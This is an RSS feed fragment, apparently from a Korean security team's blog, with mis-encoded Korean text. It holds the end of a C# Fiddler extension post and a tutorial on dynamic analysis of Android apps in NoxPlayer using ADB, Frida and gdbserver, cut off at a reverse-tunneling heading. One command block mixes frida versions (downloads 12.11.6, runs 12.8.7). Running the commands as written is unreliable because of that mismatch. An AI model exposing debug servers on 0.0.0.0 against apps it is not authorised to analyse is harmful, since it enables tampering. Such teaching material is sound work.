					&lt;span class=&quot;n&quot;&gt;FiddlerApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tabsViews&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SelectTab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FiddlerApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tabsViews&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TabPages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IndexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnLoad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;TabPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ImageIndex&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fiddler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SessionIcons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;TextBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Multiline&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AcceptsTab&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AutoSize&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AllowDrop&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadOnly&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ScrollBars&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ScrollBars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Both&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dock&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DockStyle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// ë“œë˜ê·¸ ì¤‘ íƒ­í™”ë©´ ì§„ì… ì´ë²¤íŠ¸&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DragEnter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DragEventHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DragEnter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

			&lt;span class=&quot;c1&quot;&gt;// ë“œë˜ê·¸ ì¤‘ íƒ­í™”ë©´ì— ëŒì–´ë†“ì•˜ì„ ë•Œ ì´ë²¤íŠ¸&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DragDrop&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DragEventHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DragDrop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

			&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Controls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

			&lt;span class=&quot;c1&quot;&gt;// Fiddler íƒ­ì— í˜ì´ì§€ ì¶”ê°€&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;FiddlerApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tabsViews&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TabPages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

			&lt;span class=&quot;c1&quot;&gt;// KeyPress ì´ë²¤íŠ¸&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;FiddlerApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lvSessions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyPress&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;KeyPressEventHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KeyPress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnBeforeUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;3. êµ¬í˜„&lt;/code&gt; ì—ì„œ ì„¤ëª…í•œ ë°©ì‹ì„ í† ëŒ€ë¡œ ê¸°ëŠ¥ì„ êµ¬í˜„í•œ ì „ì²´ ì†ŒìŠ¤ì½”ë“œì…ë‹ˆë‹¤. í˜„ì¬ëŠ” GET, POST Methodì—ì„œ ì¼ë°˜ì ì¸ íŒŒë¼ë¯¸í„°ë§Œ ì²˜ë¦¬ê°€ ê°€ëŠ¥í•œ ìˆ˜ì¤€ì´ë©°, ì¶”í›„ JSON ë° íŒŒì¼ ì—…ë¡œë“œ ì²˜ë¦¬ ë“±ì˜ ê¸°ëŠ¥ì„ ì¶”ê°€í•  ì˜ˆì •ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;5-ê¸°ëŠ¥&quot;&gt;5. ê¸°ëŠ¥&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sun0707.png&quot; alt=&quot;/assets/sun0707.png&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Fiddler ì¢Œì¸¡ì˜ ì„¸ì…˜ë·°ì—ì„œ í•­ëª©ì„ ì„ íƒí•œ ë’¤ â€˜aâ€™ë¥¼ ëˆ„ë¥´ë©´ ìë™ìœ¼ë¡œ &lt;code class=&quot;highlighter-rouge&quot;&gt;requests&lt;/code&gt; íƒ­ìœ¼ë¡œ ì´ë™í•˜ë©°, Python Requests ëª¨ë“ˆì„ ì´ìš©í•˜ì—¬ HTTP Requestë¥¼ ìš”ì²­í•  ìˆ˜ ìˆëŠ” ê¸°ë°˜ ì½”ë“œë¥¼ ìƒì„±í•´ì¤ë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;ë˜ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;requests&lt;/code&gt; íƒ­ì„ í™œì„±í™”ì‹œí‚¨ ìƒíƒœì—ì„œ ì„¸ì…˜ í•­ëª©ì„ ë“œë˜ê·¸í•˜ì—¬ ëŒì–´ë‹¤ ë†“ì•„ë„ ë™ì¼í•œ ê²°ê³¼ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ë³€í™˜ ì‹œ ë‚´ìš©ì€ í´ë¦½ë³´ë“œì— ìë™ìœ¼ë¡œ ë³µì‚¬ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;5-ì°¸ì¡°&quot;&gt;5. ì°¸ì¡°&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.telerik.com/fiddler/Extend-Fiddler/ExtendWithDotNet&quot;&gt;https://docs.telerik.com/fiddler/Extend-Fiddler/ExtendWithDotNet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://gist.github.com/y3rsh/1054336/6df9d5f12079966fa845d243fbe1a7581be1358b&quot;&gt;https://gist.github.com/y3rsh/1054336/6df9d5f12079966fa845d243fbe1a7581be1358b&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/qiaofei32/Fiddler-Request-To-code&quot;&gt;https://github.com/qiaofei32/Fiddler-Request-To-code&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/milantgh/p/4805280.html&quot;&gt;https://www.cnblogs.com/milantgh/p/4805280.html&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/Fiddler-Extension</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/Fiddler-Extension</guid>
        
        <category>programming</category>
        
        
      </item>
    
      <item>
        <title>Android Application Dynamic Analysis in Remote NoxPlayer</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜&lt;/p&gt;

&lt;h1 id=&quot;noxplayer&quot;&gt;NoxPlayer?&lt;/h1&gt;

&lt;p&gt;Nox App PlayerëŠ” PCì—ì„œ ëª¨ë°”ì¼ ê²Œì„ì„ ë¹„ë¡¯í•œ ëª¨ë°”ì¼ Applicationë“¤ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” Emulator ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;android-app-dynamic-analysis-with-noxplayer&quot;&gt;Android App Dynamic Analysis with NoxPlayer&lt;/h1&gt;

&lt;p&gt;Android Applicationì„ ë™ì ìœ¼ë¡œ ë¶„ì„í•˜ê³ ì í•  ë•Œ Android OSì˜ Deviceê°€ ì—†ëŠ” ê²½ìš° NoxPlayerë¥¼ ì‚¬ìš©í•˜ì—¬ ë¶„ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ADB, Frida, gdbë¥¼ ëª¨ë‘ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê°ê°ì˜ ì‚¬ìš© ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;1-adb&quot;&gt;1. ADB&lt;/h2&gt;

&lt;h3 id=&quot;-adb-connect&quot;&gt;# ADB Connect&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/soo0700.png&quot; alt=&quot;/assets/soo0700.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;NoxPlayerì˜ Deviceì— ADBë¥¼ ì‚¬ìš©í•˜ê³ ì í•  ë•Œ Deviceë¥¼ ì‹¤í–‰í•œ ìƒíƒœì—ì„œ  &lt;code class=&quot;highlighter-rouge&quot;&gt;adb devices&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ë©´ ìœ„ì™€ ê°™ì´ devicesë¥¼ ì°¾ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;NoxPlayerì˜ DeviceëŠ” &lt;strong&gt;ADB ì ‘ì†ì„ USB í†µì‹ ì´ ì•„ë‹Œ Network í†µì‹ &lt;/strong&gt;ì„ í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ &lt;strong&gt;Network í†µì‹ ì„ ìœ„í•œ ADB Port&lt;/strong&gt;ë¥¼ ì°¾ì•„ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/soo0701.png&quot; alt=&quot;/assets/soo0701.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;NoxPlayerì˜ Deviceë“¤ì˜ &lt;strong&gt;Process ì´ë¦„ì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;NoxVMHandle.exe&lt;/code&gt;&lt;/strong&gt;ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;NoxVMHandle.exe&lt;/code&gt;ê°€ LISTENING í•˜ê³  ìˆëŠ” Portë¥¼ ì°¾ì•„ë³´ë‹ˆ ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/soo0702.png&quot; alt=&quot;/assets/soo0702.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LISTENING í•˜ê³  ìˆëŠ” Portë¥¼ 1ê°œì”© &lt;code class=&quot;highlighter-rouge&quot;&gt;adb connect 127.0.0.1:{PORT}&lt;/code&gt; í•˜ê³  ë‚˜ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;adb devices&lt;/code&gt; ëª…ë ¹ì–´ë¡œ devices ë¦¬ìŠ¤íŠ¸ë¥¼ í™•ì¸ í•´ë³¸ ê²°ê³¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;62001&lt;/code&gt; ì´ ADBë¥¼ ì ‘ì†í•  ìˆ˜ ìˆëŠ” Port ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/soo0703.png&quot; alt=&quot;/assets/soo0703.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;adb connect&lt;/code&gt;ë¥¼ ì—¬ëŸ¬ë²ˆ í–ˆê¸° ë•Œë¬¸ì— ì—¬ëŸ¬ deviceê°€ ë“±ë¡ë˜ì–´ ìˆê³  adbì— &lt;code class=&quot;highlighter-rouge&quot;&gt;-s&lt;/code&gt; ì˜µì…˜ì„ í†µí•´ì„œ ì›í•˜ëŠ” deviceë¥¼ ì„ íƒí•´ì•¼í•©ë‹ˆë‹¤. ë˜ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;adb kill-server&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ í†µí•´ì„œ ì—°ê²°ëœ ëª¨ë“  deviceë¥¼ ì´ˆê¸°í™” ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;-adb-connect-with-multi-device&quot;&gt;# ADB Connect with Multi Device&lt;/h3&gt;

&lt;p&gt;NoxPlayerì˜ ê²½ìš° ë©€í‹° ì•±í”Œë ˆì´ì–´ ê¸°ëŠ¥ì„ í†µí•´ ì—¬ëŸ¬ Deviceë¥¼ ë™ì‹œì— ì‹¤í–‰ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ëŸ¬ Deviceë¥¼ ë™ì‹œì— ì‹¤í–‰í•˜ê³  ìˆì„ ê²½ìš° ê°ê°ì˜ ADB Connectë¥¼ ìœ„í•œ PortëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/soo0704.png&quot; alt=&quot;/assets/soo0704.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LISTENING í•˜ê³  ìˆëŠ” Port ì¤‘ì—ì„œ ìœ„ ê³¼ì •ì„ ë°˜ë³µí•œ ê²°ê³¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;62025&lt;/code&gt;ê°€ ë‹¤ë¥¸ Deviceì˜ ADB ì ‘ì† Port ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/soo0705.png&quot; alt=&quot;/assets/soo0705.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LISTENING í•˜ê³  ìˆëŠ” Port ì¤‘ì—ì„œ ìœ„ ê³¼ì •ì„ ë°˜ë³µí•œ ê²°ê³¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;62026&lt;/code&gt;ê°€ ë‹¤ë¥¸ Deviceì˜ ADB ì ‘ì† Port ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ &lt;strong&gt;NoxPlayerì—ì„œ ADBë¥¼ Connect í•˜ê¸° ìœ„í•œ PORT&lt;/strong&gt;ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;127.0.0.1:62001&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;127.0.0.1:62025&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;127.0.0.1:62026&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;127.0.0.1:62027&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;127.0.0.1:62028&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;2-frida&quot;&gt;2. Frida&lt;/h2&gt;

&lt;p&gt;NoxPlayerì˜ Deviceì—ì„œë„ ì¼ë°˜ì ì¸ Android OSì˜ Deviceì²˜ëŸ¼ frida-serverë¥¼ ì„¤ì¹˜í•˜ëŠ” ë°©ë²•ìœ¼ë¡œ Fridaë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;frida-serverëŠ” &lt;a href=&quot;https://github.com/frida/frida/releases&quot;&gt;https://github.com/frida/frida/releases&lt;/a&gt; ì—ì„œ ë‹¤ìš´ë¡œë“œ ê°€ëŠ¥í•˜ë©° NoxPlayerì˜ ê²½ìš° x86 ê¸°ë°˜ì˜ ì—ë®¬ë ˆì´í„°ì´ê¸° ë•Œë¬¸ì—&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;frida-server-{version}-android-x86&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ë¥¼ ë‹¤ìš´ë¡œë“œ ë°›ì•„ì„œ ADBë¥¼ í†µí•´ NoxPlayerì˜ Deviceì— ì•„ë˜ì™€ ê°™ì´ ë„£ì–´ì¤€ë’¤ ì‹¤í–‰í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# frida-server download &amp;amp; push&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; https://github.com/frida/frida/releases/download/12.11.6/frida-server-12.11.6-android-x86.xz
xz &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; frida-server-12.11.6-android-x86.xz
adb &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 127.0.0.1:62001 push frida-server-12.11.6-android-x86 /data/local/tmp/

&lt;span class=&quot;c&quot;&gt;# frida-server chmod &amp;amp; run&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /data/local/tmp/
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;755 frida-server-12.8.7-android-x86
./frida-server-12.8.7-android-x86
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;3-gdb&quot;&gt;3. GDB&lt;/h2&gt;

&lt;p&gt;NoxPlayerì—ì„œë„ gdb-serverë¥¼ ì´ìš©í•˜ì—¬ gdbë¥¼ í†µí•œ ë””ë²„ê¹…ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://chromium.googlesource.com/android_tools/+/refs/heads/2403/ndk/prebuilt/android-x86/gdbserver&quot;&gt;https://chromium.googlesource.com/android_tools/+/refs/heads/2403/ndk/prebuilt/android-x86/gdbserver&lt;/a&gt;ì—ì„œ x86 gdbserverë¥¼ ë‹¤ìš´ë¡œë“œ ë°›ì€ ë’¤ ì‹¤í–‰í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# gdbserver download &amp;amp; push&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; https://chromium.googlesource.com/android_tools/+archive/refs/heads/2403/ndk/prebuilt/android-x86/gdbserver.tar.gz
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xvf&lt;/span&gt; gdbserver.tar.gz
adb &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 127.0.0.1:62001 push gdbserver /data/local/tmp/

&lt;span class=&quot;c&quot;&gt;# gdbserver chmod &amp;amp; run&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /data/local/tmp/
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;755 gdbserver 
./gdbserver 0.0.0.0:62002 &lt;span class=&quot;nt&quot;&gt;--attach&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;PID]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;android-app-dynamic-analysis-with-remote-noxplayer&quot;&gt;Android App Dynamic Analysis with Remote NoxPlayer&lt;/h1&gt;

&lt;p&gt;NoxPlayerê°€ ë¶„ì„ í™˜ê²½ì—ì„œ ì„¤ì¹˜ë˜ì§€ ì•Šì€ ê²½ìš° Serverì— NoxPlayerë¥¼ ì„¤ì¹˜í•˜ê³  Remote í™˜ê²½ì—ì„œ ì ‘ì†í•˜ì—¬ ë¶„ì„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ Androd OSì˜ ê¸°ê¸°ê°€ ì—†ìœ¼ë©° NoxPlayerë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ëŠ” í™˜ê²½ì—ì„œë„ Serverì— ì„¤ì¹˜ëœ NoxPlayerë¥¼ ì´ìš©í•˜ì—¬ ì•ˆë“œë¡œì´ë“œ ì–´í”Œë¦¬ì¼€ì´ì…˜ì„ ë™ì ìœ¼ë¡œ ë¶„ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ìµœì¢…ì ìœ¼ë¡œ Frida Server, ADB, GDB Serverë¥¼ ì‚¬ìš©í•  PORTëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;62000 - Frida Server&lt;/li&gt;
  &lt;li&gt;62001 - Nox ADB&lt;/li&gt;
  &lt;li&gt;62002 - GDB Server&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-windows-í™˜ê²½ì˜-noxplayerê°€-ì„¤ì¹˜ëœ-server&quot;&gt;1. &lt;strong&gt;Windows í™˜ê²½ì˜ NoxPlayerê°€ ì„¤ì¹˜ëœ Server&lt;/strong&gt;&lt;/h2&gt;

&lt;h3 id=&quot;-reverse-tunneling&quot;&gt;# Reverse Tunneling&lt;/h3&gt;

